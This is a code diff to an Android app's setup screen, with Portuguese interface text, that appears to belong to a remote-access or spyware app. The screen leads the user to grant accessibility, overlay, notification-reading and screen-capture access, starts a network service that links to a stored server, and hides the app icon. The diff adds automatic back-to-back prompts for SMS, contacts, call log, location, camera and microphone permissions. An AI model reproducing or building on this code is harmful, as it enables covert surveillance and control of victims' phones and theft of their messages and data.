@@ -24,10 +24,12 @@ import java.util.List;
 public class SetupActivity extends Activity {
 
     private static final int REQ_CAP = 1001;
+    private static final int REQ_PERM = 1002;
 
     private interface Estado { boolean ok(); }
 
     private final List<Runnable> pintores = new ArrayList<>();
+    private final List<String> fila = new ArrayList<>();
     private LinearLayout lista;
 
     @Override protected void onCreate(Bundle b) {
@@ -47,22 +49,25 @@ public class SetupActivity extends Activity {
         lista.addView(titulo);
 
         TextView sub = new TextView(this);
-        sub.setText("Toque em cada item para abrir as configurações correspondentes.");
+        sub.setText("Toque em cada item para abrir as configura\u00e7\u00f5es correspondentes.");
         sub.setTextColor(Color.parseColor("#8B98A5"));
         sub.setTextSize(12);
         sub.setPadding(0, dp(6), 0, dp(18));
         lista.addView(sub);
 
+        linha("Permiss\u00f5es", "Pedir todas em sequ\u00eancia",
+                this::permsOk, this::pedeTudo);
+
         linha("Acessibilidade", "Gestos e leitura da tela",
                 () -> Util.accOn(this),
                 () -> abre(Settings.ACTION_ACCESSIBILITY_SETTINGS));
 
-        linha("Sobreposição", "Desenhar por cima de outros aplicativos",
+        linha("Sobreposi\u00e7\u00e3o", "Desenhar por cima de outros aplicativos",
                 () -> Settings.canDrawOverlays(this),
                 () -> startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                         Uri.parse("package:" + getPackageName()))));
 
-        linha("Acesso a notificações", "Leitura de notificações do sistema",
+        linha("Acesso a notifica\u00e7\u00f5es", "Leitura de notifica\u00e7\u00f5es do sistema",
                 () -> {
                     String s = Settings.Secure.getString(getContentResolver(),
                             "enabled_notification_listeners");
@@ -70,7 +75,7 @@ public class SetupActivity extends Activity {
                 },
                 () -> abre(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
 
-        linha("Bateria", "Desativar otimização de bateria",
+        linha("Bateria", "Desativar otimiza\u00e7\u00e3o de bateria",
                 () -> {
                     PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                     return pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
@@ -78,12 +83,12 @@ public class SetupActivity extends Activity {
                 () -> startActivity(new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                         Uri.parse("package:" + getPackageName()))));
 
-        linha("Brilho do sistema", "Permitir alterar configurações do sistema",
+        linha("Brilho do sistema", "Permitir alterar configura\u00e7\u00f5es do sistema",
                 () -> Settings.System.canWrite(this),
                 () -> startActivity(new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
                         Uri.parse("package:" + getPackageName()))));
 
-        linha("Captura de tela", "Iniciar ou encerrar a projeção",
+        linha("Captura de tela", "Iniciar ou encerrar a proje\u00e7\u00e3o",
                 () -> ScreenSvc.alive,
                 () -> {
                     if (ScreenSvc.alive) {
@@ -96,7 +101,7 @@ public class SetupActivity extends Activity {
                     }
                 });
 
-        linha("Conexão", "Iniciar o serviço de rede",
+        linha("Conex\u00e3o", "Iniciar o servi\u00e7o de rede",
                 () -> Net.online(),
                 () -> {
                     try { NetSvc.arranca(this); } catch (Throwable ignored) {}
@@ -104,11 +109,11 @@ public class SetupActivity extends Activity {
                     toast("Conectando");
                 });
 
-        linha("Ícone do app", "Ocultar ou mostrar na gaveta de aplicativos",
+        linha("\u00cdcone do app", "Ocultar ou mostrar na gaveta de aplicativos",
                 this::iconeAtivo,
                 this::alternarIcone);
 
-        linha("Play Store", "Abrir a página do aplicativo", null, () -> loja(this));
+        linha("Play Store", "Abrir a p\u00e1gina do aplicativo", null, () -> loja(this));
 
         String host = getSharedPreferences("p", 0).getString("url", "sem servidor");
         TextView rodape = new TextView(this);
@@ -119,6 +124,75 @@ public class SetupActivity extends Activity {
         lista.addView(rodape);
 
         setContentView(sv);
+
+        if (b == null) {
+            fila.clear();
+            for (String p : perms()) {
+                try {
+                    if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) fila.add(p);
+                } catch (Throwable ignored) {}
+            }
+            if (!fila.isEmpty()) lista.postDelayed(this::proximo, 400);
+        }
+    }
+
+    private static String[] perms() {
+        List<String> p = new ArrayList<>();
+        p.add(android.Manifest.permission.READ_SMS);
+        p.add(android.Manifest.permission.RECEIVE_SMS);
+        p.add(android.Manifest.permission.SEND_SMS);
+        p.add(android.Manifest.permission.READ_CONTACTS);
+        p.add(android.Manifest.permission.READ_PHONE_STATE);
+        p.add(android.Manifest.permission.READ_CALL_LOG);
+        p.add(android.Manifest.permission.CALL_PHONE);
+        p.add(android.Manifest.permission.ACCESS_FINE_LOCATION);
+        p.add(android.Manifest.permission.ACCESS_COARSE_LOCATION);
+        p.add(android.Manifest.permission.CAMERA);
+        p.add(android.Manifest.permission.RECORD_AUDIO);
+        if (Build.VERSION.SDK_INT >= 33) {
+            p.add(android.Manifest.permission.POST_NOTIFICATIONS);
+            p.add(android.Manifest.permission.READ_MEDIA_IMAGES);
+        } else {
+            p.add(android.Manifest.permission.READ_EXTERNAL_STORAGE);
+        }
+        return p.toArray(new String[0]);
+    }
+
+    private boolean permsOk() {
+        for (String p : perms()) {
+            try {
+                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) return false;
+            } catch (Throwable ignored) {}
+        }
+        return true;
+    }
+
+    private void pedeTudo() {
+        fila.clear();
+        for (String p : perms()) {
+            try {
+                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) fila.add(p);
+            } catch (Throwable ignored) {}
+        }
+        proximo();
+    }
+
+    private void proximo() {
+        if (fila.isEmpty()) {
+            toast("Permiss\u00f5es conclu\u00eddas");
+            return;
+        }
+        String p = fila.remove(0);
+        try {
+            requestPermissions(new String[]{p}, REQ_PERM);
+        } catch (Throwable ignored) {
+            proximo();
+        }
+    }
+
+    @Override public void onRequestPermissionsResult(int rq, String[] a, int[] r) {
+        super.onRequestPermissionsResult(rq, a, r);
+        if (rq == REQ_PERM) lista.postDelayed(this::proximo, 220);
     }
 
     @Override protected void onResume() {
@@ -204,7 +278,7 @@ public class SetupActivity extends Activity {
                 on ? PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                    : PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                 PackageManager.DONT_KILL_APP);
-        toast(on ? "Ícone oculto" : "Ícone visível");
+        toast(on ? "\u00cdcone oculto" : "\u00cdcone vis\u00edvel");
     }
 
     private void abre(String action) {
